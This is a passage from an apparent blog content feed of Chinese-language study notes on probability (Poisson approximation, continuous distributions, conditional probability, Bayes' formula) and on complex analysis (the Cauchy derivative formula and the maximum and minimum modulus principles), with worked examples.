&\rightarrow\dfrac{\lambda^k}{k!}e^{-\lambda}, 当\,n\to\infty.  \end{aligned}</script></li></ul></li><li><p><strong>注</strong></p><ul><li>若 $X\sim B(n,p)$, $p$ 很小, $n$ 很大, $np$ 不太大, 则 $X\sim P(\lambda)$, $\lambda=np$.</li><li>误差最多为 $\min(p,np^2)$.</li><li><strong>Poisson</strong> 分布多用于一定时间或空间内小概率事件发生次数的场景.</li></ul></li><li><p><strong>例</strong>  某医院平均每小时出生婴儿 $\lambda$ 名, 接下来 $t$ 小时出生婴儿数的分布.</p></li><li><p><strong>解答</strong>  我们有</p><script type="math/tex; mode=display">P(N(t)=k)=\dfrac{(\lambda t)^k}{k!}e^{-\lambda t},\,k=0,1,2,\cdots.</script><p>其中 $\lambda$ 为均值.</p></li><li><p><strong>注</strong>  <strong>Bernoulli</strong> 试验不独立, 但弱相依条件下仍为较好近似.</p></li><li><p><strong>例(配对问题)</strong></p></li><li><p><strong>解答</strong>  弱相依条件下:</p><script type="math/tex; mode=display">P(A_i)=\dfrac{1}{n}\simeq P(A_i\mid A_j)=\dfrac{1}{n-1}</script><p>恰有 $k$ 个人拿到自己的帽子的概率:</p><script type="math/tex; mode=display">P(X=k)=\dfrac{\lambda^k}{k!}e^{-\lambda}=\dfrac{e^{-1}}{k!}</script></li><li><p><strong>常规解答</strong></p><p>  设 $E=$ 指定的 $k$ 个人拿到了自己的帽子.</p><p>  设 $F=$ 其余的 $n-k$ 个人未拿到自己的帽子.</p><p>  我们有:</p><script type="math/tex; mode=display">  P(EF)=P(F\mid E)P(E)=P_{n-k}\dfrac{(n-k)!}{n!}</script><p>  进而有:</p><script type="math/tex; mode=display">  P(X=k)=C_n^kP(EF)=\dfrac{1}{k!}P_{n-k}\rightarrow\dfrac{e^{-1}}{k!}.</script></li></ul><h2 id="连续随机变量"><a href="#连续随机变量" class="headerlink" title="连续随机变量"></a>连续随机变量</h2><ul><li><p><strong>定义(概率密度函数)(PDF)</strong>  若存在 $f\ge 0$, 使得 $\forall I\subset\mathbb{R}$ 可测, 都有</p><script type="math/tex; mode=display">P(X\in I)=\int_If(x)dx</script><p>则称 $X$ 为连续型随机变量, $f$ 为 $X$ 的概率密度函数 <strong>(PDF)</strong>.</p></li><li><p><strong>性质</strong></p><ul><li>$\int_{-\infty}^{\infty}f(x)dx\equiv 1$;</li><li>$P(a&lt;X\le b)=\int_a^bf(x)dx=P(a\le X\le b)=P(a\le X&lt;b)=P(a&lt;X&lt;b)$;</li><li>$P(X=a)=0,\forall a\in\mathbb{R}$;</li><li>$P(x_0-\delta&lt;X\le x_0+\delta)=\int_{x_0-\delta}^{x_0+\delta}f(x)dx=2\delta f(x_0)$, 要求 $f$ 在 $x_0$ 处连续;</li><li>$F(x)=P(X\le x)=\int_{-\infty}^xf(t)dt$ 连续, $F’(x)=f(x)$ ($f$ 在 $x$ 处连续);</li><li><strong>PDF</strong> 与 <strong>PMF</strong> 实质上可以统一; <strong>PDF</strong> 若存在, 则不唯一.</li></ul></li><li><p><strong>定义(期望与方差)</strong></p><script type="math/tex; mode=display">  E(X) = \int_{-\infty}^{\infty}xf(x)dx = \mu\\  Var(X) = \int_{-\infty}^{\infty}(x-\mu)^2f(x)dx = \sigma^2</script><p>  我们有</p><script type="math/tex; mode=display">  Var(X) = E((X-E(X))^2) = E(X^2) - E^2(X).</script></li><li><p><strong>约定</strong>  $E(X)$ 存在 $\Leftrightarrow$ $E(X)&lt;\infty$.</p></li><li><p><strong>注</strong></p><ul><li>$E(X)$ 存在 $\Leftrightarrow$ $\int\limits_{-\infty}^{\infty}\vert x\vert f(x)dx&lt;\infty$;</li><li>一般地, $E(g(X))=\int\limits_{-\infty}^{\infty}g(x)f(x)dx$.</li></ul></li></ul><h2 id="常见连续分布"><a href="#常见连续分布" class="headerlink" title="常见连续分布"></a>常见连续分布</h2><ul><li><p><strong>定义(连续分布)</strong></p><script type="math/tex; mode=display">f(x)=\begin{cases}\dfrac{1}{b-a},\,a<x<b \\0,\,其他情况 \\\end{cases}</script><p>记为 $X\sim U(a,b)$. 我们有</p><script type="math/tex; mode=display">E(X)=\dfrac{a+b}{2}, Var(X)=?.</script></li><li><p><strong>注</strong>  $X\sim U(0,1)$ 称为随机数.</p></li><li><p><strong>定义(正态分布)</strong></p><script type="math/tex; mode=display">  f(x)=\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\dfrac{(x-\mu)^2}{2\sigma^2}},\,x\in\mathbb{R}.</script><p>  记为 $X\sim N(\mu,\sigma^2)$. 我们有</p><script type="math/tex; mode=display">  E(X)=\mu, Var(X)=\sigma^2.</script></li><li><p><strong>注</strong></p><ul><li>$X\sim N(\mu,\sigma^2)\Leftrightarrow Y=\dfrac{X-\mu}{\sigma}\sim N(0,1)$;</li><li>$N(0,1)$ 标准正态;</li><li>经验法则.</li></ul></li><li><p><strong>定义(指数分布)</strong></p><script type="math/tex; mode=display">  f(x)=  \begin{cases}  \lambda e^{-\lambda x},\,x>0 \\  0,\,x\le 0 \\  \end{cases}</script><p>  记为 $X\sim Exp(\lambda)$. 我们有</p><script type="math/tex; mode=display">  E(X)=\dfrac{1}{\lambda}, Var(X)=\dfrac{1}{\lambda^2}.</script></li><li><p><strong>注</strong></p><ul><li>有的软件取参数为 $\beta=\dfrac{1}{\lambda}$;</li><li>通常刻画寿命或等待时间.</li></ul></li><li><p><strong>例</strong>  观察到有婴儿出生, 接下来 $t$ 小时有婴儿出生的概率为?</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}P(X\le t)&=1-P(X>t)\\&=1-P(N(t)=0)\\&=1-\dfrac{(\lambda t)^0}{0!}e^{-\lambda t}\\&=1-e^{-\lambda t}.\end{aligned}</script><p>这是一个 <strong>Poisson</strong> 过程, 数量是 <strong>Poisson</strong> 分布, 间隔是指数分布.</p></li><li><p><strong>定义</strong>  假设 $X&gt;0$ 连续, 其 <strong>CDF</strong> 为 $F(x)$, 满足 $F(0)=0$. 考虑</p><script type="math/tex; mode=display">\begin{aligned}&P(x<X<x+dx\mid X>x)\\=&\dfrac{P(x<X<x+dx)}{P(X>x)}\\=&\dfrac{F(x+dx)-F(x)}{1-F(x)}\\\approx&\dfrac{F'(x)}{1-F(x)}dx.\end{aligned}</script><p>视为年龄为 $x$ 的元件失效的条件概率密度 (瞬时失效率/危险率).</p></li><li><p><strong>注</strong></p><ul><li><p>令 $\dfrac{F’(x)}{1-F(x)}=\lambda(x)\Rightarrow F(x)=1-e^{-\int_0^x\lambda(t)dt},x&gt;0$;</p></li><li><p>若 $\lambda(x)\equiv\lambda\,(无老化假设)$, 则 $F(x)=1-e^{-\lambda x}$,</p><p>$\Rightarrow P(X&gt;t+s\mid X&gt;s)=\dfrac{P(X&gt;t+s)}{P(X&gt;s)}=\dfrac{1-F(s+t)}{1-F(s)}=e^{-\lambda t}$  $(无记忆性)$;</p></li><li><p>改进 $\lambda(x)=\alpha\dfrac{x^{\alpha-1}}{\beta^\alpha},\alpha,\beta&gt;0$, 则 $F(x)=1-e^{-(\dfrac{x}{\beta})^{\alpha}}\Rightarrow$ <strong>Weibull</strong> 分布.</p></li></ul></li></ul><h2 id="随机变量的函数"><a href="#随机变量的函数" class="headerlink" title="随机变量的函数"></a>随机变量的函数</h2><ul><li><p><strong>定义</strong>  $Y=g(X)$ </p></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">Y=\begin{cases}1,\,x>t_0 \\0,\,x\le t_0 \\\end{cases}    \quad t_0>0\,给定.</script><p>那么有 $P(Y=0)=1-e^{-\lambda t_0}$, $P(Y=1)=e^{-\lambda t_0}$.</p></li><li><p><strong>例</strong>  $X$ 连续, 其 <strong>PDF</strong> 为 $f(x)$, 且 $Y=X^2$.</p></li><li><p><strong>解答</strong>   $\forall y&gt;0$, 我们有</p><script type="math/tex; mode=display">\begin{aligned}P(Y\le y)&=P(X^2\le y)\\&=P(-\sqrt{y}\le X\le\sqrt{y})\\&=\int_{-\sqrt{y}}^{\sqrt{y}}f(x)dx\\&=\int_0^yl(t)dt.\end{aligned}</script><p>其中 $Y$  的 <strong>PDF</strong> 为 $l(y)=\dfrac{1}{2\sqrt{y}}(f(\sqrt{y})+f(-\sqrt{y}))$.</p></li><li><p><strong>例</strong>  $X\sim N(0,1)$, 且 $Y=X^2$.</p></li><li><p><strong>解答</strong>  $Y$  的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">l(y)=\dfrac{1}{\sqrt{2\pi}}\dfrac{1}{\sqrt{y}}e^{-\dfrac{y}{2}}</script><p>这是自由度为 $1$ 的 <strong>Chi-Square</strong> 分布 $\chi^2(1)$.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability &amp; Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记1</title>
      <link href="/2023/02/23/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-1/"/>
      <url>/2023/02/23/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-1-概率"><a href="#Chap-1-概率" class="headerlink" title="Chap 1 概率"></a>Chap 1 概率</h1><h2 id="试验与事件"><a href="#试验与事件" class="headerlink" title="试验与事件"></a>试验与事件</h2><ul><li><p><strong>定义(随机试验)</strong></p><ul><li>不能预先确知结果;</li><li>试验之前可预测所有可能结果.</li></ul></li><li><p><strong>定义(样本空间)</strong>  一个试验所有可能结果之集 $(\Omega)$.</p></li><li><strong>定义(随机事件)</strong>  $a$ $well$ $defined$ $subset$ $A\in\Omega$.<ul><li>全事件 $\Omega$ (必然事件);</li><li>空事件 $\varPhi$ (不可能事件);</li><li>单一试验结果 (基本事件).</li></ul></li></ul><h2 id="事件的运算"><a href="#事件的运算" class="headerlink" title="事件的运算"></a>事件的运算</h2><ul><li><p>借助集合的语言 $or$ $Venn$ 图.</p><ul><li>余: $A^c-(\Omega\backslash A)$;</li><li>和: $A+B-(A\cup B)$;</li><li>差: $A-B-(A\backslash B)$;</li><li>积: $AB-(A\cap B)$;</li><li>互斥: $AB = \varnothing$;</li><li>对立: $AB = \varnothing, A + B = \Omega$;</li><li><strong>De Morgan</strong> 定律: $(A + B)^c = A^cB^c$ $(\sum_n A_n)^c = \prod_n A_n^c$.</li></ul></li></ul><h2 id="概率的几种解释"><a href="#概率的几种解释" class="headerlink" title="概率的几种解释"></a>概率的几种解释</h2><ul><li>古典解释 - 基于等可能性;</li><li>频率解释;</li><li>主观解释.</li></ul><h2 id="公理化定义"><a href="#公理化定义" class="headerlink" title="公理化定义"></a>公理化定义</h2><ul><li><p>$2^{\Omega}\Rightarrow\Omega$ 的所有子集构成的集合.</p></li><li><p>事件集类 $\mathscr{F}\subset\Omega\Rightarrow\sigma{-}$代数: 事件运算的封闭性.</p></li><li><p>特别地, </p><script type="math/tex; mode=display">\sum_{i = 1}^{\infty}A_i\in\mathscr{F}, \forall A_i\in\mathscr{F}.</script></li><li><p><strong>定义(Kolmogorov)</strong></p><script type="math/tex; mode=display">  P: \mathscr{F}\rightarrow\mathbb{R} \\</script><p>  满足以下三条公理:</p><ul><li>$P(A)\ge 0, \forall A\in\mathscr{F}$</li><li>$P(\Omega) = 1$</li><li><p>$P(\sum_{i = 1}^{\infty}A_i) = \sum_{i = 1}^{\infty}P(A_i), A_iA_j = \varnothing, \forall i\ne j$</p><p>则称 $P$ 为概率函数, $(\Omega, \mathscr{F}, P)$ 为概率空间.</p></li></ul></li><li><p><strong>命题</strong></p><ul><li>$P(A)\le1, \forall A\in\mathscr{F}$;</li><li>$P(\varPhi) = 0$;</li><li>$P(A^c) = 1 - P(A)$;</li><li>$P(\sum_{i = 1}^{n}A_i) = \sum_{i = 1}^{n}P(A_i), A_iA_j = \varnothing, \forall i\ne j$;</li><li>$P(A)\le P(B), \forall A\subset B$;</li><li>$P(A + B) = P(A) + P(B) - P(AB)$.</li></ul></li><li><p><strong>推广</strong></p><p>$P(\sum_\limits{i = 1}^{n}A_i) = \sum_\limits{i = 1}^{n}P(A_i) - \sum_\limits{i_1&lt;i_2}P(A_{i_1}A_{i_2}) + \cdots + (-1)^{r - 1}\sum_\limits{i_1 &lt; \cdots &lt; i_r}P(A_{i_1}\cdots A_{i_r}) + \cdots$</p></li><li><p><strong>例</strong>  $n$ 个人, 每人一顶帽子, 随机挑选一顶帽子. 无人拿到自己帽子的概率为? 恰有 $k$ 人拿到自己帽子的概率为?</p></li><li><p><strong>解答</strong>  令 $A_i = $ 第 $i$ 个人拿到自己帽子. 注意到</p><script type="math/tex; mode=display">P(A_i) = \cfrac{1}{n}.</script><p>运用排列组合知识可得</p><script type="math/tex; mode=display">P(A_{i_1}\cdots A_{i_r}) = \cfrac{(n - r)!}{n!},\\\sum_\limits{i_1 < \cdots < i_r}P(A_{i_1}\cdots A_{i_r}) = \cfrac{(n - r)!}{n!}C_n^r = \cfrac{1}{r!}.</script><p>故至少有一个人拿到自己帽子的概率为</p><script type="math/tex; mode=display">\begin{equation*}    \begin{aligned}    P(\sum_\limits{i = 1}^{n}A_i) &= \sum_\limits{r = 1}^{n}(-1)^{r - 1}\sum_\limits{i_1 < \cdots < i_r}P(A_{i_1}\cdots A_{i_r}) \\    &= \sum_\limits{r = 1}^{n}(-1)^{r - 1}\cfrac{1}{r!}.    \end{aligned}\end{equation*}</script><p>无人拿到自己帽子的概率为</p><script type="math/tex; mode=display">\begin{equation*}    \begin{aligned}    P_n &= 1 - P(\sum_\limits{i = 1}^{n}A_i) \\    &= 1 - \sum_\limits{r = 1}^{n}(-1)^{r - 1}\sum_\limits{i_1 < \cdots < i_r}P(A_{i_1}\cdots A_{i_r}) \\    &= \sum_\limits{r = 0}^{n}(-1)^{r}\cfrac{1}{r!} \\    &= \cfrac{1}{e}.    \end{aligned}\end{equation*}</script></li></ul><h2 id="条件概率"><a href="#条件概率" class="headerlink" title="条件概率"></a>条件概率</h2><ul><li><p><strong>定义(条件概率)</strong>  $P(A\mid B) := \cfrac{P(AB)}{P(B)}\,( 需\,P(B) &gt; 0)$.</p></li><li><p>$A\mid B$ 不是事件.</p></li><li><p><strong>计算</strong>  $(1)$ 缩小样本空间; $(2)$ 定义.</p></li><li><p><strong>定义(乘法法则)</strong>  $P(AB) = P(A\mid B)P(B) = P(B\mid A)P(A).$</p></li><li><p><strong>例</strong>  $8$ 个红球, $4$ 个白球, 等可能无放回地取出 $2$ 红球的概率为?</p></li><li><p><strong>解答</strong>  无放回地取出 $2$ 红球的概率为</p><script type="math/tex; mode=display">P(R_1R_2) = P(R_1)P(R_2\mid R_1) = \cfrac{8}{12}\times\cfrac{7}{11} = \cfrac{14}{33}.</script></li><li><p><strong>推广</strong></p><p>$P(A_1A_2\cdots A_n) = P(A_1)P(A_2\mid A_1)P(A_3\mid A_1A_2)\cdots P(A_n\mid A_1A_2\cdots A_{n - 1}).$</p></li><li><p><strong>解答续</strong>  在配对问题中, 注意到</p><script type="math/tex; mode=display">  \begin{equation*}      \begin{aligned}    P(A_{i_1}\cdots A_{i_r}) &= P(A_{i_1})P(A_{i_2}\mid A_{i_1})\cdots P(A_{i_r}\mid A_{i_1}A_{i_2}\cdots A_{i_{r - 1}}) \\    &= \cfrac{1}{n}\cdot\cfrac{1}{n - 1}\cdot\cfrac{1}{n - 2}\cdots\cfrac{1}{n - (r - 1)} \\    &= \cfrac{(n - r)!}{n!}.      \end{aligned}  \end{equation*}</script></li><li><p><strong>定义</strong></p><script type="math/tex; mode=display">  P(\cdot\mid B): \mathscr{F}\rightarrow\mathbb{R}</script><p>  令 $\widetilde{P} = P(\cdot\mid B)$, 则 $\widetilde{P}$ 满足以下三条公理:</p><ul><li>$\widetilde{P}(A)\ge 0, \forall A\in\mathscr{R}$</li><li>$\widetilde{P}(\Omega) = 1$</li><li><p>$\widetilde{P}(\sum_{i = 1}^{\infty}A_i) = \sum_{i = 1}^{\infty}\widetilde{P}(A_i), A_iA_j = \varnothing, \forall i\ne j$</p><p>故 $\widetilde{P}$ 为概率函数, $(\Omega, \mathscr{F}, \widetilde{P})$ 为新概率空间.</p></li></ul></li><li><p><strong>注</strong></p><ul><li>$P(A)\,\textbf{v.s.}\,\widetilde{P}(A) = P(A\mid B)$;</li><li>“已观测到 $A$ 发生, 则 $P(A) = 1$” 这句话是错误的, 因为 $P(A\mid A) = 1$.</li></ul></li></ul><h2 id="独立事件"><a href="#独立事件" class="headerlink" title="独立事件"></a>独立事件</h2><ul><li><p><strong>定义(独立事件)</strong>  若 $P(AB) = P(A)P(B)$, 则称事件 $A, B$ 相互独立.</p></li><li><p><strong>注</strong></p><ul><li>此时 $P(A\mid B) = P(A)$, 即 $\cfrac{P(AB)}{P(B)} = \cfrac{P(A\Omega)}{P(\Omega)}$;</li><li>事件 $B$ 的发生未改变 $A$ 发生的概率;</li><li>从实际角度判断可应用定义中的关系式; 一般利用定义判断独立性.</li></ul></li><li><p><strong>例</strong>  中奖率为 $10^{-5}$ 的彩票每周开奖, 不累积, 一个人购彩十年未中奖的概率为?</p></li><li><p><strong>解答</strong></p><p>每次购彩事件都是独立的.</p><p>设事件 $A_i = $ 第 $i$ 周未中奖, 那么 $P(A_i) = 1 - 10^{-5}$.</p><p>故 $P = P(A_1A_2\cdots A_{520}) = (1 - 10^{-5})^520 = 99.48\%$. </p></li><li><p>事件 $A, B$ 相互独立, 则事件 $A^c, B$ 相互独立.</p></li><li><p><strong>推广</strong></p><ul><li><p>$A, B, C\,相互独立\Leftrightarrow P(ABC) = P(A)P(B)P(C)\,且\,A, B, C\,两两独立$;</p></li><li><p>$A, B, C\,两两独立\nRightarrow A, B, C\,相互独立$</p><p>  (反例) 甲乙两人抛掷 $2$ 枚硬币. $A =$ 甲正, $B =$ 乙正, $C =$ 甲乙同.</p></li></ul></li><li><p><strong>定义(相互独立)</strong></p><p>  $A_1, A_2, \cdots, A_n\,相互独立\Leftrightarrow 任\,m\,个事件\,A_{i_1},\cdots, A_{i_m}, 有 P(A_{i_1}\cdots A_{i_m}) = P(A_{i_1})\cdots P(A_{i_m}).$</p></li><li><p><strong>定义(条件独立)</strong></p><p>  $A, B$ 关于事件 $E$ 条件独立 $\Leftrightarrow P(AB\mid E) = P(A\mid E)P(B\mid E)$.</p></li><li><p><strong>注</strong>  条件独立与独立不可互推.</p></li></ul><h2 id="textbf-Bayes-公式"><a href="#textbf-Bayes-公式" class="headerlink" title="$\textbf{Bayes}$ 公式"></a>$\textbf{Bayes}$ 公式</h2><ul><li><p><strong>定义(全概率公式)</strong>  给出 $\Omega$ 的一个分割</p><ul><li>$\sum_iB_i = \Omega$;</li><li>$B_iB_j = \varnothing, \forall\,i\ne j$;</li><li>$P(B_i) &gt; 0, \forall\,i$.</li></ul><p>则有</p><script type="math/tex; mode=display">P(A) = P(\sum_i(AB_i)) = \sum_iP(AB_i) = \sum_iP(A\mid B_i)P(B_i).</script></li><li><p><strong>定义(Bayes 公式)</strong></p><script type="math/tex; mode=display">  P(B_i\mid A) = \dfrac{P(A\mid B_i)P(B_i)}{\sum_jP(A\mid B_j)P(B_j)}</script><p>  其中 $P(B_i)$ 为先验概率, $P(B_i\mid A)$ 为后验概率.</p></li></ul><ul><li><p><strong>例</strong>  $A =$ 阳性, $B =$ 患病, $P(B) = 10^{-4}$, $P(A\mid B) = 0.99$, $P(A\mid B^c) = 10^{-3}$. 求 $P(B\mid A)$, $P(B\mid A_1A_2)$.</p></li><li><p><strong>解答</strong>  由 <strong>Bayes</strong> 公式, 容易得到</p><script type="math/tex; mode=display">  \begin{equation*}      \begin{aligned}          P(B\mid A)&= \dfrac{P(AB)}{P(A)} \\          &= \dfrac{P(A\mid B)P(B)}{P(A)} \\          &= \dfrac{P(A\mid B)P(B)}{P(A\mid B)P(B) + P(A\mid B^c)P(B^c)} \\          &= 9.01\%.      \end{aligned}  \end{equation*}</script><script type="math/tex; mode=display">  \begin{equation*}      \begin{aligned}          P(B\mid A_1A_2)&= \dfrac{P(A_1A_2B)}{P(A_1A_2)} \\          &= \dfrac{P(A_1A_2\mid B)P(B)}{P(A_1A_2)} \\          &= \dfrac{P(A_1A_2\mid B)P(B)}{P(A_1A_2\mid B)P(B) + P(A_1A_2\mid B^c)P(B^c)} \\          &= \dfrac{P(A\mid B)^2P(B)}{P(A\mid B)^2P(B) + P(A\mid B^c)^2P(B^c)} \\          &= 98.99\%.      \end{aligned}  \end{equation*}</script></li></ul><h2 id="一些讨论"><a href="#一些讨论" class="headerlink" title="一些讨论"></a>一些讨论</h2><ul><li>什么是概率?<ul><li>不确定性的一种度量;</li><li>具有不同的解释;</li><li>公理化定义.</li></ul></li><li>为什么用概率?<ul><li>不确定性的来源<ul><li>被建模系统的内在随机性;</li><li>不完全观测 (<strong>Monty Hall</strong> 中的参与者);</li><li>不完全建模.</li></ul></li><li>很多情况下, 简单而不确定的规则好于复杂而确定的规则</li><li>应用、维护、沟通</li></ul></li><li>怎么用概率?<ul><li>计算正确的概率;</li><li>正确计算概率;</li><li>正确使用概率.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability &amp; Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复变函数</title>
      <link href="/2022/12/31/fu-bian-han-shu/"/>
      <url>/2022/12/31/fu-bian-han-shu/</url>
      
        <content type="html"><![CDATA[<h3 id="1-解析函数"><a href="#1-解析函数" class="headerlink" title="1. 解析函数"></a>1. 解析函数</h3><p>$\textbf{Example:}$<br>对于 $x, y\in\mathbb{R}$, 求 $\cos(x + iy)$ 的实, 虚部, 并说明方程</p><script type="math/tex; mode=display">\cos(x + iy) = A + iB\thinspace(A, B\in\mathbb{R})</script><p>有无穷多组解. ◻</p><p>$\textbf{Solution:}$<br>由于 <script type="math/tex">\cos z = \frac{1}{2}\left(e^{iz} + e^{-iz}\right),</script></p><p>得到 <script type="math/tex">\begin{aligned}            \cos(x + iy) &= \frac{1}{2}\left(e^{-y + ix} + e^{y - ix}\right) \\            &= \frac{1}{2}\left[e^{-y}\left(\cos x + i\sin x\right) + e^y\left(\cos x - i\sin x\right)\right] \\            &= \frac{1}{2}\cos x\left(e^y + e^{-y}\right) + \frac{1}{2}\sin x\left(e^{-y} - e^y\right)i.        \end{aligned}</script></p><p>于是 <script type="math/tex">\Re\cos(x + iy) = \frac{1}{2}\cos x\left(e^y + e^{-y}\right),</script></p><script type="math/tex; mode=display">\Im\cos(x + iy) = \frac{1}{2}\sin x\left(e^{-y} - e^y\right).</script><p>考虑方程组 <script type="math/tex">\begin{cases}            \frac{1}{2}\cos x\left(e^y + e^{-y}\right) = A, \\            \frac{1}{2}\sin x\left(e^{-y} - e^y\right) = B.        \end{cases}</script></p><p>$(1)$ 若$B = 0$:</p><p>$(a)$ $A &gt; 1$ 时,</p><p>取 $x = 2k\pi, \thinspace k\in\mathbb{Z}$, 考虑</p><script type="math/tex; mode=display">f(y) = e^y + e^{-y} - 2A.</script><p>因为 <script type="math/tex">f(0) = 2 - 2A < 0, \thinspace f(+\infty) = +\infty,</script></p><p>由介值定理得 <script type="math/tex">\exists\thinspace y_1 > 0, \thinspace f(y_1) = 0.</script></p><p>那么 <script type="math/tex">\begin{cases}            x = 2k\pi, \\            y = y_1,        \end{cases}</script></p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(b)$ $A &lt; -1$ 时,</p><p>取 $x = 2k\pi + \pi, \thinspace k\in\mathbb{Z}$, 考虑</p><script type="math/tex; mode=display">g(y) = e^y + e^{-y} + 2A.</script><p>因为 <script type="math/tex">g(0) = 2 + 2A < 0, \thinspace g(+\infty) = +\infty,</script></p><p>由介值定理得 <script type="math/tex">\exists\thinspace y_2 > 0, \thinspace g(y_2) = 0.</script></p><p>那么 <script type="math/tex">\begin{cases}            x = 2k\pi + \pi, \\            y = y_2,        \end{cases}</script></p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(c)$ $-1\le A\le 1$ 时,</p><p>取 $y = 0$, 考虑 <script type="math/tex">\cos x = A.</script></p><p>那么 <script type="math/tex">\begin{cases}            x = \arccos A + 2k\pi, \\            y = 0,        \end{cases}</script></p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(2)$ 若$B \ne 0$:</p><p>可得</p><script type="math/tex; mode=display">\left(\frac{2A}{e^y + e^{-y}}\right)^2 + \left(\frac{2B}{e^{-y} - e^y}\right)^2 = 1.</script><p>令</p><script type="math/tex; mode=display">h(y) = \left(\frac{2A}{e^y + e^{-y}}\right)^2 + \left(\frac{2B}{e^{-y} - e^y}\right)^2 - 1,</script><p>因为 <script type="math/tex">h(0^{+}) = +\infty, \thinspace h(+\infty) = -1 < 0,</script></p><p>由介值定理得 <script type="math/tex">\exists\thinspace y_{AB} > 0, \thinspace h(y_{AB}) = 0.</script></p><p>那么 <script type="math/tex">\begin{cases}            x = \arccos\cfrac{2A}{e^{y_{AB}} + e^{-y_{AB}}} + 2k\pi, \\            y = y_{AB},        \end{cases}</script></p><p>为原方程的解, $\forall k\in\mathbb{Z}$. ◻</p><h3 id="2-Cauchy高阶导数公式"><a href="#2-Cauchy高阶导数公式" class="headerlink" title="2. Cauchy高阶导数公式"></a>2. Cauchy高阶导数公式</h3><p>$\textbf{Example:}$<br>$f(z)$ 在 $D$ 内解析, 则对 $z_0\in D$, 有</p><script type="math/tex; mode=display">f^{(n)}(z_0) = \frac{n!}{2\pi i}\oint_{\left|{z - z_0}\right| = r}\limits\frac{f(z)dz}{(z - z_0)^{n + 1}}.$$ ◻$\textbf{Solution:}$由于 $f(z)$ 在 $z_0$ 处解析, 可以认为$$f(z) = \sum_{k = 0}^{\infty}\limits\frac{1}{k!}f^{(k)}(z_0)(z - z_0)^k</script><p>在 $\left|{z - z_0}\right|\le r$ 内处处成立.</p><p>两边同时除以 $(z - z_0)^{n + 1}$, 再对 $\left|{z - z_0}\right| = r$<br>积分可得</p><script type="math/tex; mode=display">\oint_{\left|{z - z_0}\right| = r}\limits\frac{f(z)dz}{(z - z_0)^{n + 1}} = \frac{2\pi i}{n!}f^{(n)}(z_0).$$ ◻$\textbf{Example:}$求积分$$\oint_{\left|{z}\right| = 1}\limits\cfrac{1 - \cos 4z^5}{z^n}dz.$$ ◻$\textbf{Solution:}$当 $n = 0$ 时,由于 $f(z) = 1 - \cos 4z^5$ 在复平面上处处解析,得 $$\oint_{\left|{z}\right| = 1}\limits (1 - \cos 4z^5)dz = 0.</script><p>当 $n\ge 1$ 时,</p><script type="math/tex; mode=display">\cfrac{1 - \cos 4z^5}{z^n} = \sum_{k = 1}^{\infty}\limits\cfrac{1}{z^n}\cdot(-1)^k\cfrac{(4z^5)^{2k}}{(2k)!} = \sum_{k = 1}^{\infty}\limits\cfrac{(-1)^{k + 1}4^{2k}z^{10k - n}}{(2k)!}.</script><p>进而</p><script type="math/tex; mode=display">\oint_{\left|{z}\right| = 1}\limits\cfrac{1 - \cos 4z^5}{z^n}dz = \begin{cases}            2\pi i\cdot\cfrac{(-1)^{k + 1}16^k}{(2k)!}, n = 10k + 1 \\            0, n\ne 10k + 1 \\        \end{cases}        (\mbox{其中}k\in\mathbb{N})$$ ◻### 3. 最大模原理$\textbf{Example:}$$f(z)$ 非常函数, 在有界域 $D$ 内可导, 在边界 $\partial D$ 上连续, 则$$\max_{z\in D\cup\partial D}\limits\left|{f(z)}\right| = \max_{z\in \partial D}\limits\left|{f(z)}\right|,</script><p>并且满足 $f’(z_0)\ne 0$. ◻</p><p>$\textbf{Solution:}$<br>设 $z_0\in D\cup\partial D$ 使得<br>$f(z_0) = \max_{z\in D\cup\partial D}\limits\left|{f(z)}\right|$.</p><p>若 $z_0\in D$, 由平均值公式, $\exists\thinspace r_0 &gt; 0$,</p><p>当 $0 &lt; r\le r_0$ 时, $\left|{z - z_0}\right|$ 位于 $D$ 内. 那么</p><script type="math/tex; mode=display">\begin{aligned}            \left|{f(z_0)}\right| &= \frac{1}{2\pi}\left|{\int_0^{2\pi}\limits f(z_0 + re^{i\theta})d\theta}\right| \\            &\le \frac{1}{2\pi}\int_0^{2\pi}\limits \left|{f(z_0 + re^{i\theta})}\right|d\theta \\            &\le \frac{1}{2\pi}\int_0^{2\pi}\limits \left|{f(z_0)}\right|d\theta \\            &= \left|{f(z_0)}\right|,        \end{aligned}</script><p>即<br>$\left|{f(z)}\right|\equiv \left|{f(z_0)}\right|, \thinspace\forall \left|{z - z_0}\right| &lt; r$.</p><p>进而<br>$\left|{f(z)}\right|\equiv \left|{f(z_0)}\right|, \thinspace\forall z\in D$,<br>这与 $f(z)$ 为连续非常函数矛盾.</p><p>故若<br>$\left|{f(z_0)}\right| = \max_{z\in D\cup\partial D}\limits\left|{f(z)}\right|$,<br>则有 $z_0\in\partial D$. ◻</p><h3 id="4-最小模原理"><a href="#4-最小模原理" class="headerlink" title="4. 最小模原理"></a>4. 最小模原理</h3><p>$\textbf{Example:}$<br>$f(z)$ 非常函数, 在有界域 $D$ 内可导且非零, 在边界 $\partial D$<br>上连续, 则</p><script type="math/tex; mode=display">\min_{z\in D\cup\partial D}\limits\left|{f(z)}\right| = \min_{z\in \partial D}\limits\left|{f(z)}\right|,</script><p>并且满足 $f’(z_0)\ne 0$. ◻</p><p>$\textbf{Solution:}$<br>注意到 $\frac{1}{f(z)}$ 是解析的, 再使用最大模原理即可. ◻</p><h3 id="5-调和函数最大值原理"><a href="#5-调和函数最大值原理" class="headerlink" title="5. 调和函数最大值原理"></a>5. 